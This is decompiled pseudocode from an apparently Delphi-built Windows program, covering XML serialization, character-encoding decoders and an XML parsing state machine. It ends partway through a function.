// 434C60: using guessed type wchar_t a13[4];
// 434C74: using guessed type wchar_t a10[4];
// 466C10: using guessed type wchar_t *off_466C10;

//----- (00434C80) --------------------------------------------------------
int __usercall sub_434C80@<eax>(int a1@<eax>, int a2)
{
  int v2; // ebx
  int v3; // eax
  int v4; // edx
  bool v5; // bl
  int v6; // eax
  int v8; // [esp-10h] [ebp-28h]
  int v9; // [esp-10h] [ebp-28h]
  unsigned int v10[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v11; // [esp-4h] [ebp-1Ch]
  BOOL *v12; // [esp+4h] [ebp-14h] BYREF
  BOOL *v13; // [esp+8h] [ebp-10h] BYREF
  int v14; // [esp+Ch] [ebp-Ch]
  int v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v16 = a1;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_434EF0;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_4348D0((int)dword_434F08, a2);
  sub_434930(*(BOOL **)(v16 + 8), a2);
  if ( *(_DWORD *)(v16 + 16) - 1 >= 0 )
  {
    v14 = *(_DWORD *)(v16 + 16);
    v15 = 0;
    do
    {
      v2 = *(_DWORD *)(*(_DWORD *)(v16 + 12) + 4 * v15);
      if ( !sub_429EA0(v2) )
      {
        v3 = *(_DWORD *)(v2 + 8);
        if ( v3 )
          v3 = *(_DWORD *)(v3 - 4);
        v4 = *(_DWORD *)(v2 + 4);
        if ( v4 )
          v4 = *(_DWORD *)(v4 - 4);
        if ( *(_DWORD *)(a2 - 12) + v3 + v4 >= 120 )
          sub_4349F0(a2);
        sub_4348D0((int)&str___13[1], a2);
        sub_434930(*(BOOL **)(v2 + 8), a2);
        sub_4348D0((int)dword_434F28, a2);
        sub_434A80(*(_DWORD *)(v2 + 4), v8, a2);
        if ( *(int *)(a2 - 24) > 0 )
        {
          sub_407AD8(*(_DWORD *)(a2 - 4), 1, *(_DWORD *)(a2 - 24), &v13);
          sub_434930(v13, a2);
        }
        sub_4348D0((int)dword_434F38, a2);
      }
      ++v15;
      --v14;
    }
    while ( v14 );
  }
  v5 = *(_DWORD *)(v16 + 28) > 0;
  if ( (*(_BYTE *)(a2 - 17) & 8) != 0 || *(_DWORD *)(v16 + 4) || *(int *)(v16 + 28) > 0 )
  {
    sub_4348D0((int)dword_434F58, a2);
    sub_434A80(*(_DWORD *)(v16 + 4), v9, a2);
    if ( *(int *)(a2 - 24) > 0 )
    {
      sub_407AD8(*(_DWORD *)(a2 - 4), 1, *(_DWORD *)(a2 - 24), &v12);
      sub_434930(v12, a2);
    }
    if ( v5 )
    {
      sub_4072D4((volatile __int32 *)(a2 - 8), dword_434F68);
      if ( *(_DWORD *)(v16 + 28) - 1 >= 0 )
      {
        v14 = *(_DWORD *)(v16 + 28);
        v15 = 0;
        do
        {
          sub_4349F0(a2);
          sub_434C80(a2);
          ++v15;
          --v14;
        }
        while ( v14 );
      }
      v6 = *(_DWORD *)(a2 - 8);
      if ( v6 )
        v6 = *(_DWORD *)(v6 - 4);
      sub_4075BC((_DWORD *)(a2 - 8), v6 - 1, 0);
      sub_4349F0(a2);
    }
    sub_4348D0((int)dword_434F78, a2);
    sub_434930(*(BOOL **)(v16 + 8), a2);
    sub_4348D0((int)dword_434F58, a2);
  }
  else
  {
    sub_4348D0((int)dword_434F48, a2);
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_434EF7;
  return sub_406CA4((int)&v12, 2);
}
// 434D55: variable 'v8' is possibly undefined
// 434DF3: variable 'v9' is possibly undefined
// 434F08: using guessed type int dword_434F08[2];
// 434F10: using guessed type _strings str___13[1];
// 434F28: using guessed type int dword_434F28[4];
// 434F38: using guessed type int dword_434F38[4];
// 434F48: using guessed type int dword_434F48[4];
// 434F58: using guessed type int dword_434F58[4];
// 434F68: using guessed type int dword_434F68[4];
// 434F78: using guessed type int dword_434F78[2];

//----- (00434F80) --------------------------------------------------------
_DWORD *__usercall sub_434F80@<eax>(int *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4@<edi>)
{
  int v5; // eax
  int *v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-18h] [ebp-3Ch] BYREF
  void *v9; // [esp-14h] [ebp-38h]
  int *v10; // [esp-10h] [ebp-34h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v12; // [esp-8h] [ebp-2Ch]
  int *v13; // [esp-4h] [ebp-28h]
  void *v14; // [esp+0h] [ebp-24h]
  int *v15; // [esp+8h] [ebp-1Ch]
  char v16; // [esp+13h] [ebp-11h]
  int *v17; // [esp+14h] [ebp-10h]
  int v18; // [esp+18h] [ebp-Ch]
  int v19; // [esp+1Ch] [ebp-8h] BYREF
  int v20; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v19 = 0;
  v20 = 0;
  v16 = a3;
  v15 = a1;
  v13 = &savedregs;
  v12 = &loc_435083;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( sub_40576C(a1, (int)&cls_CrossPlatform_TCustomMemoryStream) )
    v17 = v15;
  else
    v17 = (int *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  v10 = &savedregs;
  v9 = &loc_43505E;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  if ( (v16 & 1) != 0 )
    (*(void (__fastcall **)(int *, void *, int, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v17 + 16))(
      v17,
      &unk_466C40,
      3,
      v10,
      v9,
      v8);
  sub_406C68(&v19);
  v18 = 0;
  if ( (v16 & 4) != 0 )
  {
    sub_4348D0((int)"<?xml version=\"1.0\" encoding=\"UTF-8\"?>", (int)&savedregs);
    sub_4349F0((int)&savedregs);
  }
  sub_434C80(a2, (int)&savedregs);
  __writefsdword(0, (unsigned int)v8);
  v10 = (int *)&loc_435065;
  if ( v17 != v15 )
  {
    v5 = (*(int (__fastcall **)(int *))*v17)(v17);
    sub_427610((int)v15, v17[1], v5, a4);
    v6 = v17;
    v17 = 0;
    sub_405598(v6);
  }
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_43508A;
  sub_406C68(&v19);
  return sub_406C44(&v20);
}
// 4226DC: using guessed type int (*cls_CrossPlatform_TCustomMemoryStream)();
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();

//----- (004350D0) --------------------------------------------------------
int __fastcall sub_4350D0(int a1, char a2, _DWORD *a3, int a4)
{
  __int64 (__fastcall ***v4)(_DWORD); // esi
  int v5; // ebx
  int v6; // eax
  char v8; // [esp+Fh] [ebp-1h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v4 = (__int64 (__fastcall ***)(_DWORD))a3;
  v8 = a2;
  v5 = a1;
  *(_DWORD *)(a1 + 16) = a4;
  *(_BYTE *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 12) = a1;
  *(_DWORD *)(a1 + 8) = sub_4353F0;
  *(_DWORD *)(a1 + 28) = a3;
  *(_QWORD *)(a1 + 40) = sub_427470(a3);
  *(_QWORD *)(v5 + 32) = (**v4)(v4) - *(_QWORD *)(v5 + 40);
  v6 = *(_DWORD *)(v5 + 32);
  *(_DWORD *)(v5 + 60) = v6;
  if ( v6 < 255 )
    *(_DWORD *)(v5 + 60) = 255;
  if ( *(int *)(v5 + 60) > 0x40000 )
    *(_DWORD *)(v5 + 60) = 0x40000;
  *(_DWORD *)(v5 + 48) = System::__linkproc__ GetMem(*(_DWORD *)(v5 + 60));
  *(_DWORD *)(v5 + 52) = 0;
  *(_DWORD *)(v5 + 56) = 0;
  sub_4377C0((_DWORD *)(v5 + 72));
  if ( v8 )
    System::__linkproc__ AfterConstruction(v5);
  return v5;
}
// 4350E4: variable 'a3' is possibly undefined
// 4350E6: variable 'a2' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00435190) --------------------------------------------------------
int __fastcall sub_435190(int a1)
{
  nullsub_3(a1);
  return System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 48));
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (004351B0) --------------------------------------------------------
int __fastcall sub_4351B0(int a1, _WORD *a2)
{
  int v3; // ebx
  unsigned __int8 v5; // [esp+Fh] [ebp-1h] BYREF

  v3 = 0;
  if ( sub_436910(a1, (char *)&v5, 1) )
  {
    if ( v5 >= 0x80u )
      *a2 = *((_WORD *)&off_466B44 + v5);
    else
      *a2 = v5;
    LOBYTE(v3) = 1;
  }
  return v3;
}
// 466B44: using guessed type void *off_466B44;

//----- (00435200) --------------------------------------------------------
int __fastcall sub_435200(int a1, _WORD *a2)
{
  int v3; // ebx
  unsigned __int8 v5; // [esp+Fh] [ebp-1h] BYREF

  v3 = 0;
  if ( sub_436910(a1, (char *)&v5, 1) )
  {
    if ( v5 >= 0x80u )
      *a2 = word_466C44[v5];
    else
      *a2 = v5;
    LOBYTE(v3) = 1;
  }
  return v3;
}
// 466C44: using guessed type __int16 word_466C44[128];

//----- (00435250) --------------------------------------------------------
int __fastcall sub_435250(int a1, _WORD *a2)
{
  int v3; // ebx
  unsigned __int8 v5; // [esp+Fh] [ebp-1h] BYREF

  v3 = 0;
  if ( sub_436910(a1, (char *)&v5, 1) )
  {
    if ( v5 >= 0x80u )
      *a2 = word_466D44[v5];
    else
      *a2 = v5;
    LOBYTE(v3) = 1;
  }
  return v3;
}
// 466D44: using guessed type __int16 word_466D44[128];

//----- (004352A0) --------------------------------------------------------
int __fastcall sub_4352A0(int a1, _WORD *a2)
{
  int v3; // ebx
  unsigned __int8 v5; // [esp+Fh] [ebp-1h] BYREF

  v3 = 0;
  if ( sub_436910(a1, (char *)&v5, 1) )
  {
    if ( (unsigned __int8)(v5 + 0x80) >= 0x20u )
      *a2 = v5;
    else
      *a2 = word_466E44[v5];
    LOBYTE(v3) = 1;
  }
  return v3;
}
// 466E44: using guessed type __int16 word_466E44[156];

//----- (004352F0) --------------------------------------------------------
int __fastcall sub_4352F0(int a1, _WORD *a2)
{
  int v3; // ebx
  unsigned __int8 v5; // [esp+Fh] [ebp-1h] BYREF

  v3 = 0;
  if ( sub_436910(a1, (char *)&v5, 1) )
  {
    *a2 = v5;
    LOBYTE(v3) = 1;
  }
  return v3;
}

//----- (00435330) --------------------------------------------------------
int __fastcall sub_435330(int a1, _WORD *a2)
{
  int v4; // ebx
  unsigned __int8 v6; // [esp+Fh] [ebp-1h] BYREF

  v4 = 0;
  if ( sub_436910(a1, (char *)&v6, 1) )
  {
    if ( v6 >= 0x80u )
    {
      (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Non us-ascii char");
    }
    else
    {
      *a2 = v6;
      LOBYTE(v4) = 1;
    }
  }
  return v4;
}
// 435384: using guessed type wchar_t aNonUsAsciiChar[18];

//----- (004353B0) --------------------------------------------------------
int __fastcall sub_4353B0(int a1, char *a2)
{
  int v3; // ebx
  __int16 v4; // ax

  v3 = 0;
  if ( sub_436910(a1, a2, 2) )
  {
    HIBYTE(v4) = *(_WORD *)a2;
    LOBYTE(v4) = HIBYTE(*(_WORD *)a2);
    *(_WORD *)a2 = v4;
    LOBYTE(v3) = 1;
  }
  return v3;
}

//----- (004353E0) --------------------------------------------------------
bool __fastcall sub_4353E0(int a1, char *a2)
{
  return sub_436910(a1, a2, 2);
}

//----- (004353F0) --------------------------------------------------------
int __fastcall sub_4353F0(int a1, _WORD *a2)
{
  unsigned int v3; // eax
  int v4; // edi
  int v5; // ebx
  unsigned int v6; // eax
  __int16 v7; // ax
  unsigned __int8 v9; // [esp+15h] [ebp-7h]
  unsigned __int8 v10; // [esp+16h] [ebp-6h] BYREF
  unsigned __int8 v11; // [esp+17h] [ebp-5h]
  _WORD *v12; // [esp+18h] [ebp-4h]

  v12 = a2;
  v11 = 0;
  v3 = *(_DWORD *)(a1 + 64);
  if ( v3 < 0x10000 )
  {
    if ( sub_436910(a1, (char *)&v10, 1) )
    {
      if ( v10 >= 0x80u )
      {
        v4 = 1;
        *(_DWORD *)(a1 + 64) = v10;
        v9 = v10;
        LOBYTE(v5) = 64;
        if ( (v10 & 0xC0) == 0xC0 )
        {
          while ( ((unsigned __int8)v5 & v9) != 0 )
          {
            if ( !sub_436910(a1, (char *)&v10, 1) )
              goto LABEL_16;
            if ( (v10 & 0xC0) != 0x80 )
              goto LABEL_16;
            *(_DWORD *)(a1 + 64) = (*(_DWORD *)(a1 + 64) << 6) | v10 & 0x3F;
            if ( ++v4 > 6 )
              goto LABEL_16;
            v5 = (unsigned __int8)v5 >> 1;
          }
          *(_DWORD *)(a1 + 64) &= dword_466F80[v4];
          if ( v4 > 1 && *(_DWORD *)(a1 + 64) <= (unsigned int)dword_466F7C[v4] )
          {
LABEL_16:
            (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Invalid UTF-8");
            return v11;
          }
          v6 = *(_DWORD *)(a1 + 64);
          if ( v6 < 0x10000 )
            v7 = *(_WORD *)(a1 + 64);
          else
            v7 = (v6 >> 10) - 10304;
          *v12 = v7;
          return 1;
        }
      }
      else
      {
        *v12 = v10;
        return 1;
      }
    }
  }
  else
  {
    *v12 = v3 & 0x3FF ^ 0xDC00;
    *(_DWORD *)(a1 + 64) = 0;
    return 1;
  }
  return v11;
}
// 435564: using guessed type wchar_t aInvalidUtf8[14];
// 466F7C: using guessed type int dword_466F7C[];
// 466F80: using guessed type int dword_466F80[7];

//----- (00435580) --------------------------------------------------------
int __usercall sub_435580@<eax>(
        int a1@<eax>,
        _WORD *a2@<edx>,
        void *a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  char v7; // zf
  unsigned int v9[2]; // [esp-18h] [ebp-28h] BYREF
  int *v10; // [esp-10h] [ebp-20h]
  int v11; // [esp-Ch] [ebp-1Ch]
  int v12; // [esp-8h] [ebp-18h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+0h] [ebp-10h] BYREF
  unsigned __int16 *v15; // [esp+4h] [ebp-Ch] BYREF
  void *v16; // [esp+8h] [ebp-8h]
  unsigned __int16 *v17; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v17 = 0;
  v15 = 0;
  v14 = 0;
  v13 = a4;
  v12 = a6;
  v11 = a5;
  v16 = a3;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_4356DF;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  LOBYTE(a4) = 1;
  if ( *(_BYTE *)(a1 + 69) == 1 )
  {
    sub_424550(a2, &v15);
    sub_407AA0((int)v15, (int)L"encoding");
    if ( v7 )
    {
      sub_424550(v16, &v17);
      if ( !*(_BYTE *)(a1 + 4) )
      {
        sub_407AA0((int)v17, (int)L"utf-8");
        if ( v7 )
        {
          sub_4369C0(a1, 3);
        }
        else
        {
          sub_407AA0((int)v17, (int)L"windows-1250");
          if ( v7 )
          {
            sub_4369C0(a1, 4);
          }
          else
          {
            sub_407AA0((int)v17, (int)L"windows-1251");
            if ( v7 )
            {
              sub_4369C0(a1, 5);
            }
            else
            {
              sub_407AA0((int)v17, (int)L"windows-1252");
              if ( v7 )
              {
                sub_4369C0(a1, 6);
              }
              else
              {
                sub_407AA0((int)v17, (int)L"windows-1254");
                if ( v7 )
                {
                  sub_4369C0(a1, 7);
                }
                else
                {
                  sub_407AA0((int)v17, (int)L"us-ascii");
                  if ( v7 )
                  {
                    sub_4369C0(a1, 8);
                  }
                  else
                  {
                    sub_407AA0((int)v17, (int)L"iso-8859-1");
                    if ( v7 )
                    {
                      sub_4369C0(a1, 9);
                    }
                    else
                    {
                      sub_407968(&v14, L"Unknown encoding: ", v16);
                      (***(void (__fastcall ****)(_DWORD, int))(a1 + 16))(*(_DWORD *)(a1 + 16), v14);
                      a4 = 0;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_4356E6;
  sub_406CA4((int)&v14, 2);
  sub_406C44(&v17);
  return a4;
}
// 435580: could not find valid save-restore pair for ebx
// 435580: could not find valid save-restore pair for edi
// 435580: could not find valid save-restore pair for esi
// 4355C6: variable 'v7' is possibly undefined
// 4356FC: using guessed type wchar_t aEncoding[9];
// 43571C: using guessed type wchar_t aUtf8[6];
// 435734: using guessed type wchar_t aWindows1250[13];
// 43575C: using guessed type wchar_t aWindows1251[13];
// 435784: using guessed type wchar_t aWindows1252[13];
// 4357AC: using guessed type wchar_t aWindows1254[13];
// 4357D4: using guessed type wchar_t aUsAscii[9];
// 4357F4: using guessed type wchar_t aIso88591[11];
// 435818: using guessed type wchar_t aUnknownEncodin[19];

//----- (00435840) --------------------------------------------------------
int __usercall sub_435840@<eax>(int a1@<eax>, _WORD *a2@<edx>, int a3@<ebx>)
{
  char v4; // zf
  unsigned int v6[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v7; // [esp-10h] [ebp-14h]
  unsigned __int16 *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_4358AD;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  LOBYTE(a3) = 1;
  *(_BYTE *)(a1 + 69) = 0;
  sub_424550(a2, &v8);
  sub_407AA0((int)v8, (int)L"xml");
  if ( v4 )
  {
    if ( *(_BYTE *)(a1 + 70) )
    {
      (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
        *(_DWORD *)(a1 + 16),
        L"Declaration allowed only once");
      a3 = 0;
    }
    else
    {
      *(_BYTE *)(a1 + 69) = 1;
      *(_BYTE *)(a1 + 70) = 1;
    }
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_4358B4;
  sub_406C44(&v8);
  return a3;
}
// 435877: variable 'v4' is possibly undefined
// 4358C8: using guessed type wchar_t aXml[4];
// 4358DC: using guessed type wchar_t aDeclarationAll[30];

//----- (00435920) --------------------------------------------------------
int __usercall sub_435920@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v3; // ecx
  unsigned __int16 v4; // si
  int v5; // edx
  int v6; // ecx
  int *v7; // eax
  char v8; // zf
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-68h] BYREF
  void *v11; // [esp-8h] [ebp-64h]
  int *v12; // [esp-4h] [ebp-60h]
  void *v13; // [esp+0h] [ebp-5Ch]
  void *v14; // [esp+8h] [ebp-54h] BYREF
  void *v15; // [esp+Ch] [ebp-50h] BYREF
  char v16; // [esp+13h] [ebp-49h]
  _WORD *v17; // [esp+14h] [ebp-48h]
  int v19; // [esp+1Ch] [ebp-40h]
  int v21; // [esp+24h] [ebp-38h]
  char v22; // [esp+2Bh] [ebp-31h]
  _WORD *v23; // [esp+2Ch] [ebp-30h]
  char v27; // [esp+33h] [ebp-29h]
  int v28; // [esp+34h] [ebp-28h]
  char v29; // [esp+39h] [ebp-23h]
  unsigned __int16 v30; // [esp+3Ah] [ebp-22h]
  int v31; // [esp+3Ch] [ebp-20h] BYREF
  unsigned __int16 v32; // [esp+40h] [ebp-1Ch] BYREF
  unsigned __int8 v33; // [esp+43h] [ebp-19h]
  int v34[3]; // [esp+44h] [ebp-18h] BYREF
  int v35; // [esp+50h] [ebp-Ch]
  int v36; // [esp+54h] [ebp-8h] BYREF
  int v37; // [esp+58h] [ebp-4h] BYREF
  int savedregs; // [esp+5Ch] [ebp+0h] BYREF

  v14 = 0;
  v15 = 0;
  v37 = 0;
  v36 = 0;
  sub_407D10((int)v34, (int)&byte_4345EC);
  v12 = &savedregs;
  v11 = &loc_435F26;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v33 = 0;
  (*(void (__fastcall **)(_DWORD, int, int, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 16) + 24))(
    *(_DWORD *)(a1 + 16),
    a1 + 20,
    a1 + 24,
    ExceptionList);
  if ( (unsigned __int8)sub_4368B0(a1, (int)&v31, 4) )
  {
    v3 = 0;
    if ( (unsigned __int16)v31 == 65279 )
    {
      sub_4369C0(a1, 2);
      v3 = 2;
    }
    else if ( (unsigned __int16)v31 == 65534 )
    {
      sub_4369C0(a1, 1);
      v3 = 2;
    }
    else if ( (v31 & 0xFFFFFF) == 12565487 )
    {
      sub_4369C0(a1, 3);
      v3 = 3;
    }
    Classes::TStream::SetPosition(*(Classes::TStream **)(a1 + 28), *(_QWORD *)(a1 + 40) + v3);
    *(_BYTE *)(a1 + 68) = 0;
    v32 = 0;
    v4 = 0;
    v28 = 0;
    v27 = 0;
    sub_4377C0(v34);
    v29 = 0;
    *(_DWORD *)(a1 + 20) = 1;
    while ( 1 )
    {
      v30 = v4;
      v4 = v32;
      if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, unsigned __int16 *))(a1 + 8))(*(_DWORD *)(a1 + 12), &v32) )
        break;
      if ( v32 == 10 )
      {
        ++*(_DWORD *)(a1 + 20);
        *(_DWORD *)(a1 + 24) = 1;
      }
      else if ( v32 != 13 )
      {
        ++*(_DWORD *)(a1 + 24);
      }
      switch ( *(_BYTE *)(a1 + 68) )
      {
        case 0:
          if ( v32 == 60 )
          {
            if ( v29 )
            {
              v7 = sub_406C44(&v36);
              if ( !(unsigned __int8)sub_436AD0(a1, v35, v34[0], v7) )
                goto LABEL_109;
              if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, int))(**(_DWORD **)(a1 + 16) + 12))(
                      *(_DWORD *)(a1 + 16),
                      v36) )
                goto LABEL_109;
            }
            *(_BYTE *)(a1 + 68) = 1;
            sub_436990(a1);
            v28 = 0;
            v27 = 0;
            sub_406C44(&v37);
            v29 = 0;
            sub_4377A0(v34);
          }
          else
          {
            sub_437740(v34, v32, v6);
            if ( (unsigned __int16)(v32 - 9) >= 2u && v32 != 13 && v32 != 32 )
              v29 = 1;
          }
          continue;
        case 1:
          switch ( v32 )
          {
            case '?':
              *(_BYTE *)(a1 + 68) = 2;
              break;
            case '!':
              *(_BYTE *)(a1 + 68) = 7;
              break;
            case '/':
              *(_BYTE *)(a1 + 68) = 8;
              break;
            default:
              *(_BYTE *)(a1 + 68) = 6;
              if ( !(unsigned __int8)sub_4360E0(a1, v32, a2) )
                goto LABEL_109;
              break;
          }
          continue;
        case 2:
          if ( *(_BYTE *)(a1 + 100) )
            goto LABEL_104;
          if ( v32 == 63 )
          {
            ++v28;
            continue;
          }
          if ( v4 != 63 )
            goto LABEL_104;
          if ( v32 == 62 )
          {
            if ( !*(_DWORD *)(a1 + 88) )
            {
              if ( !*(_DWORD *)(a1 + 72) )
              {
                (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
                  *(_DWORD *)(a1 + 16),
                  L"Empty processing instruction tag name");
                goto LABEL_109;
              }
              sub_407AD8(*(_DWORD *)(a1 + 84), 1, *(_DWORD *)(a1 + 72), (_DWORD *)(a1 + 88));
              v17 = *(_WORD **)(a1 + 88);
              if ( *(_BYTE *)(a1 + 68) == 2 )
                v16 = sub_435840(a1, v17, a1);
              else
                v16 = (*(int (__fastcall **)(_DWORD, _WORD *))(**(_DWORD **)(a1 + 16) + 4))(*(_DWORD *)(a1 + 16), v17);
              if ( !v16 )
                goto LABEL_109;
            }
            *(_BYTE *)(a1 + 68) = 0;
          }
          else
          {
            if ( v28 )
            {
              LOWORD(v5) = 63;
              if ( !(unsigned __int8)sub_4360E0(a1, v5, a2) )
                goto LABEL_109;
            }
LABEL_104:
            if ( !(unsigned __int8)sub_4360E0(a1, v32, a2) )
              goto LABEL_109;
          }
          continue;
        case 3:
          if ( v32 == 45 )
          {
            ++v28;
          }
          else if ( v32 == 62 && v4 == 45 && v30 == 45 && v28 > 1 )
          {
            *(_BYTE *)(a1 + 68) = 0;
          }
          continue;
        case 4:
          if ( v32 == 62 && v4 == 93 && v30 == 93 )
          {
            sub_407AD8(v35, 1, v34[0] - 2, &v36);
            if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, int))(**(_DWORD **)(a1 + 16) + 12))(
                    *(_DWORD *)(a1 + 16),
                    v36) )
              goto LABEL_109;
            *(_BYTE *)(a1 + 68) = 0;
          }
          else
          {
            sub_437740(v34, v32, v6);
          }
          continue;
        case 5:
          if ( v27 )
          {
            if ( v32 == 93 )
              v27 = 0;
          }
          else if ( v32 == 91 )
          {
            v27 = 1;
          }
          else if ( v32 == 62 )
          {
            *(_BYTE *)(a1 + 68) = 0;
          }
          continue;
        case 6:
          if ( *(_BYTE *)(a1 + 100) )
            goto LABEL_50;
          if ( v32 == 47 )
            continue;
          if ( v32 == 62 )
          {
            if ( !*(_DWORD *)(a1 + 88) )
            {
              if ( !*(_DWORD *)(a1 + 72) )
              {
                (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Empty tag name");
                goto LABEL_109;
              }
              sub_407AD8(*(_DWORD *)(a1 + 84), 1, *(_DWORD *)(a1 + 72), (_DWORD *)(a1 + 88));
              v23 = *(_WORD **)(a1 + 88);
              if ( *(_BYTE *)(a1 + 68) == 2 )
                v22 = sub_435840(a1, v23, a1);
              else
                v22 = (*(int (__fastcall **)(_DWORD, _WORD *))(**(_DWORD **)(a1 + 16) + 4))(*(_DWORD *)(a1 + 16), v23);
              if ( !v22 )
                goto LABEL_109;
            }
            if ( v4 == 47 )
            {
              v21 = *(_DWORD *)(a1 + 88);
              if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, int))(**(_DWORD **)(a1 + 16) + 8))(
                      *(_DWORD *)(a1 + 16),
                      v21) )
                goto LABEL_109;
            }
            *(_BYTE *)(a1 + 68) = 0;
          }
          else
          {
            if ( v4 == 47 )
            {
              (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
                *(_DWORD *)(a1 + 16),
                L"Unexpected end sequence");
              goto LABEL_109;
            }
LABEL_50:
            if ( !(unsigned __int8)sub_4360E0(a1, v32, a2) )
              goto LABEL_109;
          }
          break;
        case 7:
          unknown_libname_48(&v15, v32);
          sub_407910(&v37, v15);
          sub_407AA0(v37, (int)L"--");
          if ( v8 )
          {
            *(_BYTE *)(a1 + 68) = 3;
          }
          else
          {
            sub_407AA0(v37, (int)L"[CDATA[");
            if ( v8 )
            {
              *(_BYTE *)(a1 + 68) = 4;
            }
            else
            {
              sub_407AA0(v37, (int)L"DOCTYPE");
              if ( v8 )
              {
                *(_BYTE *)(a1 + 68) = 5;
              }
              else
              {
                v19 = v37;
                if ( v37 )
                  v19 = *(_DWORD *)(v19 - 4);
                if ( v19 >= 7 )
                {
                  (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(
                    *(_DWORD *)(a1 + 16),
                    L"Unknown special tag");
                  goto LABEL_109;
                }
              }
            }
          }
          continue;
        case 8:
          if ( v32 == 62 )
          {
            if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, int))(**(_DWORD **)(a1 + 16) + 8))(
                    *(_DWORD *)(a1 + 16),
                    v37) )
              goto LABEL_109;
            *(_BYTE *)(a1 + 68) = 0;
          }
          else
          {
            unknown_libname_48(&v14, v32);
            sub_407910(&v37, v14);
          }
          continue;
        default:
          continue;
      }
    }
    if ( *(_BYTE *)(a1 + 68) )
      (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"Unexpected end of file");
    else
      v33 = (*(int (__fastcall **)(_DWORD))(**(_DWORD **)(a1 + 16) + 28))(*(_DWORD *)(a1 + 16));
  }
  else
  {
    (***(void (__fastcall ****)(_DWORD, const wchar_t *))(a1 + 16))(*(_DWORD *)(a1 + 16), L"small file");
  }
LABEL_109:
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_435F2D;
  sub_406CA4((int)&v14, 2);
  sub_407DEC((int)v34, (int)&byte_4345EC);
  sub_406CA4((int)&v36, 2);
  return v33;
}
// 435AFB: variable 'v6' is possibly undefined
// 435C99: variable 'v8' is possibly undefined
// 435EB4: variable 'v5' is possibly undefined
// 4077A8: using guessed type int __fastcall unknown_libname_48(_DWORD, _DWORD);
// 4345EC: using guessed type char byte_4345EC;
// 435F44: using guessed type wchar_t aSmallFile[11];
// 435F68: using guessed type wchar_t aEmptyTagName[15];
// 435F94: using guessed type wchar_t aUnexpectedEndS[24];
// 435FD0: using guessed type wchar_t asc_435FD0[3];
// 435FE4: using guessed type wchar_t aCdata[8];
// 436000: using guessed type wchar_t aDoctype[8];
// 43601C: using guessed type wchar_t aUnknownSpecial[20];
// 436050: using guessed type wchar_t aEmptyProcessin[38];
// 4360A8: using guessed type wchar_t aUnexpectedEndO[23];
// 435920: using guessed type unsigned __int16 var_1C;

//----- (004360E0) --------------------------------------------------------
int __usercall sub_4360E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  unsigned __int16 v6; // ax
  int v8; // esi
  _WORD *v9; // eax
  char v10; // al
